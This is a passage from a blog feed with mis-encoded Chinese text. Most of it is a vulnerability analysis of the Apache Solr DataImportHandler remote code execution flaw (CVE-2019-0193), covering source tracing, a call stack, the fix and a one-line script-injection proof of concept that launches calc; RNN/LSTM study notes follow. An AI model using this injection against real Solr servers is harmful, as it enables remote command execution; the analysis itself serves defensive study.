¹æ®requestæ‰¾åˆ°<code>HttpSolrCall</code>å¯¹è±¡ï¼Œå†è°ƒç”¨<code>HttpSolrCal#call()</code>æ–¹æ³•è·å–è¿”å›å€¼ã€‚</p><p>é‚£ä¹ˆè·Ÿåˆ°<code>org.apache.solr.servlet.HttpSolrCall#call()</code>çœ‹ä¸‹â€¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();</span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">    <span class="keyword">if</span> (shouldAudit(EventType.ERROR)) &#123;</span><br><span class="line">      cores.getAuditLoggerPlugin().doAudit(<span class="keyword">new</span> AuditEvent(EventType.ERROR, ex, req));</span><br><span class="line">    &#125;</span><br><span class="line">    sendError(ex);</span><br><span class="line">    <span class="comment">// walk the the entire cause chain to search for an Error</span></span><br><span class="line">    Throwable t = ex;</span><br><span class="line">    <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (t <span class="keyword">instanceof</span> Error) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><h3 id="æ‰¾å…¥å£ç‚¹"><a href="#æ‰¾å…¥å£ç‚¹" class="headerlink" title="æ‰¾å…¥å£ç‚¹"></a>æ‰¾å…¥å£ç‚¹</h3><p>å®åœ¨çœ‹ä¸ä¸‹å»äº†ï¼Œæ ¹æœ¬ä¸çŸ¥é“èµ°å“ªä¸ªcaseï¼Œè¿˜æ˜¯åŠ¨æ€è°ƒè¯•å§ï¼Œä¹‹å‰å·²ç»ç”¨jwdpèµ·äº†é¡¹ç›®ï¼Œç°åœ¨æŠŠsolræºç ä¸‹ä¸‹æ¥ï¼Œç”¨IDEAèµ·ä¸€ä¸ªé¡¹ç›®ï¼Œç„¶ååŠ <code>dist</code>å’Œ<code>server/lib</code>ç›®å½•åˆ°libraryé‡Œï¼Œç”¨RemoteDebugä¸‹æ–­ç‚¹è°ƒè¯•å°±è¡Œäº†ã€‚</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png" alt="image-20191103160037181"></p><p>è®¿é—®é‚£ä¸ªapiåï¼Œè°ƒè¯•å‘ç°èµ°çš„æ˜¯<code>PROCESS</code>çš„caseï¼š</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png" alt="image-20191103161357607"></p><p>ç»§ç»­å‘ä¸‹çœ‹åˆ°å›¾ä¸­542è¡Œï¼š<code>org.apache.solr.servlet.HttpSolrCall#execute()</code>ï¼Œè·Ÿè¿›å»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(SolrQueryResponse rsp)</span> </span>&#123;</span><br><span class="line">  solrReq.getContext().put(<span class="string">"webapp"</span>, req.getContextPath());</span><br><span class="line">  solrReq.getCore().execute(handler, solrReq, rsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–åˆ°SolrCoreï¼Œæ‰§è¡Œå…¶<code>org.apache.solr.core.SolrCore#execute()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨<code>handler.handleRequest(req,rsp)</code>å¯¹reqåšå¤„ç†ï¼š</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103162039712.png" alt="image-20191103162039712"></p><p>åœ¨<code>handler.handleRequest(req,rsp)</code>ä¸­ä¼šè°ƒç”¨<code>org.apache.solr.handler.RequestHandlerBase#handleRequestBody()</code>æ–¹æ³•ï¼Œå¦‚æœæ˜¯ä¹‹å‰èƒ½é™æ€åˆ†æåˆ°è¿™é‡Œï¼Œå¯ä»¥åƒChamd5çš„å¤§ä½¬ä¸€æ ·ï¼Œæœç´¢è¯¥ç±»çš„å®ç°ï¼Œå‘ç°<code>dataimport.DataImportHandler#handleRequestBody()</code>è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯ç°åœ¨æ—¢ç„¶å·²ç»åŠ¨æ€è°ƒè¯•äº†ï¼Œé‚£ç›´æ¥è·Ÿè¿›å»å°±è¡Œäº†ã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬ç»ˆäºæ‰¾åˆ°äº†å¤„ç†è¯¥è¯·æ±‚çš„å…¥å£ã€‚</p><h3 id="è°ƒç”¨æ ˆ"><a href="#è°ƒç”¨æ ˆ" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequestBody</span><span class="params">(SolrQueryRequest req, SolrQueryResponse rsp)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    rsp.setHttpCaching(<span class="keyword">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> figure out why just the first one is OK...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    SolrParams params = req.getParams();</span><br><span class="line">    NamedList defaultParams = (NamedList) initArgs.get(<span class="string">"defaults"</span>);</span><br><span class="line">    RequestInfo requestParams = <span class="keyword">new</span> RequestInfo(req, getParamsMap(params), contentStream);</span><br><span class="line">    String command = requestParams.getCommand();    </span><br><span class="line">    <span class="keyword">if</span> (DataImporter.SHOW_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command != <span class="keyword">null</span> &amp;&amp; DataImporter.ABORT_CMD.equals(command)) &#123;</span><br><span class="line">      importer.runCmd(requestParams, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (importer.isBusy()) &#123;<span class="comment">/*...*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// RCE</span></span><br><span class="line">      <span class="keyword">if</span> (DataImporter.FULL_IMPORT_CMD.equals(command)</span><br><span class="line">              || DataImporter.DELTA_IMPORT_CMD.equals(command) ||</span><br><span class="line">              IMPORT_CMD.equals(command)) &#123;</span><br><span class="line">        importer.maybeReloadConfiguration(requestParams, defaultParams);</span><br><span class="line">        <span class="comment">// è·å–ä¸€ä¸ªSolrWriter</span></span><br><span class="line">        DIHWriter sw = getSolrWriter(processor, loader, requestParams, req);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (requestParams.isDebug()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (debugEnabled) &#123;</span><br><span class="line">            <span class="comment">// Synchronous request for the debug mode</span></span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// Asynchronous request for normal mode</span></span><br><span class="line">          <span class="keyword">if</span>(requestParams.getContentStream() == <span class="keyword">null</span> &amp;&amp; !requestParams.isSyncMode())&#123;</span><br><span class="line">            importer.runAsync(requestParams, sw);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DataImporter.RELOAD_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rsp.add(<span class="string">"status"</span>, importer.isBusy() ? <span class="string">"busy"</span> : <span class="string">"idle"</span>);</span><br><span class="line">    rsp.add(<span class="string">"importResponse"</span>, message);</span><br><span class="line">    rsp.add(<span class="string">"statusMessages"</span>, importer.getStatusMessages());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šæå–å‡ºrequestçš„å‚æ•°ï¼Œç„¶åå…³é”®åœ¨ç¬¬18-39è¡Œï¼Œå¦‚æœæ˜¯è°ƒè¯•æ¨¡å¼(requestParams.isDebug())ï¼Œåˆ™åŒæ­¥æ‰§è¡Œimporterï¼Œå¦‚æœä¸æ˜¯åˆ™å¼‚æ­¥æ‰§è¡Œï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œå¯ä»¥æŠŠpayloadåŠ ä¸€ä¸ª<code>debug=true</code>å‚æ•°ï¼Œè°ƒè¯•åŒæ­¥çš„åˆ†æ”¯ï¼š</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103165424861.png" alt="image-20191103165424861"></p><p>ç»§ç»­å‘ä¸‹è·Ÿï¼Œ<code>DataImporter#runCmd()</code>è°ƒç”¨<code>DataImporter#doFullImport()</code>â€”â€”å› ä¸ºæˆ‘ä»¬å‚æ•°æ˜¯<code>command=full-import</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFullImport</span><span class="params">(DIHWriter writer, RequestInfo requestParams)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Starting Full Import"</span>);</span><br><span class="line">    setStatus(Status.RUNNING_FULL_DUMP);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DIHProperties dihPropWriter = createPropertyWriter();</span><br><span class="line">      setIndexStartTime(dihPropWriter.getCurrentTimestamp());</span><br><span class="line">      docBuilder = <span class="keyword">new</span> DocBuilder(<span class="keyword">this</span>, writer, dihPropWriter, requestParams);</span><br><span class="line">      checkWritablePersistFile(writer, dihPropWriter);</span><br><span class="line">      docBuilder.execute();</span><br><span class="line">      <span class="keyword">if</span> (!requestParams.isDebug())</span><br><span class="line">        cumulativeStatistics.add(docBuilder.importStatistics);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œå¤§æ¦‚å°±å¯ä»¥çŒœåˆ°é—®é¢˜åœ¨ç¬¬9è¡Œâ€”â€”<code>docBuilder.execute()</code>äº†ï¼Œå¯¼å…¥çš„dataConfigæ—¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œè€Œconfigä¸­å¯ä»¥è‡ªå†™jsè„šæœ¬ï¼Œåˆæƒ³åˆ°Nashornè§£æçš„jsè„šæœ¬èƒ½æ‰§è¡Œjavaå‘½ä»¤ï¼Œè¿™å°±å¯¼è‡´äº†æœ¬æ¬¡çš„æ¼æ´ã€‚</p><p>è·Ÿå®Œåç»­çš„è°ƒç”¨æ ˆå§ï¼Œsinkç‚¹åœ¨<code>ScriptTransformer#initEngine()</code>çš„87è¡Œâ€”â€”<code>ScriptEngine#eval(String)</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.handler.dataimport.DocBuilder#doFullDump</span><br><span class="line">  DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl)</span><br><span class="line">    DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl, List&lt;EntityProcessorWrapper&gt;):L476</span><br><span class="line">      EntityProcessorWrapper#nextRow:L280</span><br><span class="line">        EntityProcessorWrapper#loadTransformers // ä¸»åŠ›é‡Œé¢çš„ç¬¬100-111è¡Œï¼Œå¦‚æœå‘ç°scriptæ ‡ç­¾ï¼Œåˆ™å‘transformersåŠ å…¥è§£æjsçš„transformer</span><br><span class="line">        EntityProcessorWrapper#applyTransformer:L222</span><br><span class="line">          ScriptTransformer#transformRow:L52</span><br><span class="line">           ScriptTransformer#initEngine:L87</span><br><span class="line">             ScriptEngine#eval(String) //è¿™é‡Œçš„stringå°±æ˜¯ä¹‹å‰scripté‡Œçš„å†…å®¹</span><br><span class="line">           javax.script.Invocable#invokeFunction//è¿™é‡Œè°ƒç”¨ä¹‹å‰funcå®šä¹‰çš„å†…å®¹ï¼Œäº§ç”ŸRCE</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨<code>ScriptEngine#eval(String)</code>å¤„å°±ç›´æ¥RCEï¼Œå³å°†scriptç›´æ¥æ¢æˆå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">&lt;![CDATA[java.lang.Runtime.getRuntime().exec("calc");]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ç¨‹åºæ—¥å¿—ä¼šæœ‰æŠ¥é”™ï¼Œå› ä¸ºinvokeFunctionæ‰¾ä¸åˆ°ï¼Œç»¼ä¸Šæœ¬æ–‡è¿˜æ˜¯é€‰æ‹©äº†å®šä¹‰å‡½æ•°çš„payloadã€‚</p><h1 id="å½±å“èŒƒå›´å’Œä¿®å¤"><a href="#å½±å“èŒƒå›´å’Œä¿®å¤" class="headerlink" title="å½±å“èŒƒå›´å’Œä¿®å¤"></a>å½±å“èŒƒå›´å’Œä¿®å¤</h1><p>æ­¤æ¼æ´å½±å“solr&lt;=8.1.1ï¼Œå¯¹æ¯”8.2.0å¯ä»¥çœ‹åˆ°ä¿®å¤æ–¹æ¡ˆï¼š</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202031725.png" alt="image-20191103202031725"></p><p>å³dataConfigå‚æ•°å¿…é¡»è¦dataConfigParam_enabledä¸ºTrueæ—¶æ‰èƒ½ä½¿ç”¨ï¼Œå¯ä»¥åœ¨é…ç½®æˆ–å¯åŠ¨å‘½ä»¤ä¸­è®¾ç½®<code>-Denable .dih.dataConfigParam=true</code></p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202135491.png" alt="image-20191103202135491"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>8æœˆä»½çš„ä¸€ä¸ªæ´äº†ï¼Œä¸€ç›´å¿™åˆ°ç°åœ¨æ‰çœ‹ï¼Œæœ¬èº«æ¼æ´ä¸å¤æ‚ï¼Œä½†å…¶ä¸­é™„åŠ è°ƒè¯•å’Œæ‰¾javaWebå…¥å£ç‚¹çš„æŠ€å·§å€¼å¾—å­¦ä¹ ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li><p>CVE-2019-0193 APACHE SOLR è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æï¼Œ <a href="https://kylingit.com/blog/cve-2019-0193-apache-solrè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æ/" target="_blank" rel="noopener">https://kylingit.com/blog/cve-2019-0193-apache-solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a> </p></li><li><p>è¯¦ç»†åˆ†æSolrçš„CVE-2019-0193ä»¥åŠvelocityæ¨¡æ¿æ³¨å…¥æ–°æ´ï¼Œ <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></p></li><li>Apache Solr DataImportHandler è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2019-0193) åˆ†æï¼Œ <a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´åˆ†æ </tag>
            
            <tag> Solr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RNNå­¦ä¹ ç¬”è®°</title>
      <link href="/ml-RNN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/ml-RNN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h1><p>æ™®é€šç¥ç»ç½‘ç»œä¸èƒ½è€ƒè™‘ä¹‹å‰ä¸€ä¸ªå•è¯å¯¹ä¸‹ä¸€ä¸ªå•è¯çš„ä½œç”¨ï¼Œå³ä¸Šä¸‹æ–‡ï¼Œå› æ­¤å¼•å…¥RNNã€‚</p><p>RNNåœ¨ä¸­é—´å±‚åŠ å…¥äº†memoryï¼Œåœ¨æ¯æ¬¡ä¼ æ’­åï¼Œå°†ä¸­é—´å±‚è¾“å‡ºå­˜å‚¨åˆ°memoryï¼Œåœ¨ä¸‹ä¸€æ¬¡ä¼ æ’­æ—¶ï¼Œå°†ç»“æœå–å‡ºä¸åŸè¾“å…¥ä¸€èµ·ä½œä¸ºè¾“å…¥ï¼Œä¹‹åå†ä¼ å‡ºåˆ°ä¸‹ä¸€å±‚ã€‚</p><p>ä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œå°†æ¿€æ´»å‡½æ•°å…¨éƒ¨å˜ä¸ºçº¿æ€§ï¼Œå¹¶ä¸”æƒé‡è®¾ä¸º1ï¼Œå‡è®¾ä¸€å¼€å§‹ï¼Œè¾“å…¥çŸ©é˜µ$[1,1]^T$ï¼Œé‚£ä¹ˆä¼šè¾“å‡º$[4,4]^T$ï¼ŒåŒæ—¶ä¸¤ä¸ªè®°å¿†ä½“ç”±0å˜ä¸º2ï¼ˆå› ä¸ºéšè—å±‚çš„è¾“å‡ºæ˜¯2ï¼‰</p><a id="more"></a><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024154745435.png" alt="image-20191024154745435"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œè¾“å…¥çŸ©é˜µ$[1,1]^T$ï¼Œè¿™æ¬¡è™½ç„¶è¾“å…¥æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ç”±äºmemoryä¸åŒï¼Œè€Œmemoryä¹Ÿæ˜¯è¾“å…¥çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤éšè—å±‚è¾“å‡ºä¸º$[6,6]^T$ï¼Œæœ€ç»ˆå‡º$[12,12]^T$</p><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155107906.png" alt="image-20191024155107906"></p><p>å› æ­¤è¾“å…¥ä¸ªå‘é‡åºåˆ—åï¼Œå¤§è‡´ä¼šæ‰§è¡Œç±»ä¼¼ä¸‹å›¾æµç¨‹</p><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155320413.png" alt="image-20191024155320413"></p><p>å¯ä»¥å°†å…¶å˜å½¢ä¸ºæ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œå³å­˜åœ¨å¤šä¸ªéšè—å±‚</p><p>åŒæ—¶ï¼Œå…¶æœ‰å¦‚ä¸‹å˜å½¢</p><ul><li><p>Elman Network: memoryå­˜ä¸­é—´å€¼</p></li><li><p>Jordan Network: memoryå­˜outputå€¼</p><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155515493.png" alt="image-20191024155515493"></p></li></ul><h1 id="Bidirectional-RNN"><a href="#Bidirectional-RNN" class="headerlink" title="Bidirectional RNN"></a>Bidirectional RNN</h1><p>åŒæ—¶trainæ­£å‘å’Œåå‘çš„ç¥ç»ç½‘ç»œï¼Œç»“åˆä¸¤ä¸ªç½‘ç»œçš„outputç»“åˆå¾—åˆ°æœ€ç»ˆoutputï¼š</p><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155601826.png" alt="image-20191024155601826"></p><h1 id="Long-Short-term-Memory-LSTM"><a href="#Long-Short-term-Memory-LSTM" class="headerlink" title="Long Short-term Memory(LSTM)"></a>Long Short-term Memory(LSTM)</h1><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äºè®°å¿†ä½“å¢åŠ ä¸‰ä¸ªé—¸é—¨ï¼š</p><ul><li><p>Input Gateï¼šæ§åˆ¶å…¶ä»–ç¥ç»å…ƒèƒ½å¦å†™å…¥è®°å¿†ä½“</p></li><li><p>Output Gateï¼šæ§åˆ¶å…¶ä»–ç¥ç»å…ƒèƒ½å¦è¯»å–è®°å¿†ä½“</p></li><li><p>Forget Gateï¼šæ§åˆ¶è®°å¿†ä½“æ˜¯å¦è¯¥æ ¼å¼åŒ–æ•°æ®</p><p>å› æ­¤è¯¥ç¥ç»ç½‘ç»œæœ‰å››ä¸ªè¾“å…¥ï¼Œä¸€ä¸ªè¾“å‡ºï¼Œæ˜¯å¦å¼€æ”¾Gateç”±ç½‘ç»œå­¦ä¹ å¾—åˆ°</p></li></ul><p><img src="/ml-RNNå­¦ä¹ ç¬”è®°/image-20191024155929389.png" alt="image-20191024155929389"></p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>Machine Learning (Hung-yi Lee, NTU) ï¼Œ <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> ï¼ˆå›¾ç‰‡æ¥æºï¼Œæè€å¸ˆè®²çš„è¯¾çœŸçš„å¾ˆå¥½ï¼Œå¤§å®¶å¯ä»¥å¬å¬çœ‹ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> åŠç›‘ç£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠç›‘ç£æœºå™¨å­¦ä¹ æ¨¡å‹å­¦ä¹ ç¬”è®°</title>
      <link href="/ml-%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/ml-%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
